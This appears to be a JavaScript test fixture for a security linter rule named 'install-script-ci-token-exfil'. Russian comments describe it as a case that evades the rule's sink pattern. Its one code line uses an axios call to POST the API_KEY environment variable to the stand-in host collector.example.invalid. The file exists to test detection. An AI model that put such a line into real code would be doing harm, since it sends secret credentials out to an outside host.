// Обход по форме стока: axios вызывается функцией, метод задан полем объекта.
// Ожидается ERROR install-script-ci-token-exfil.
const axios = require('axios');

axios({ url: 'https://collector.example.invalid/c', method: 'POST', headers: { Authorization: process.env.API_KEY } });
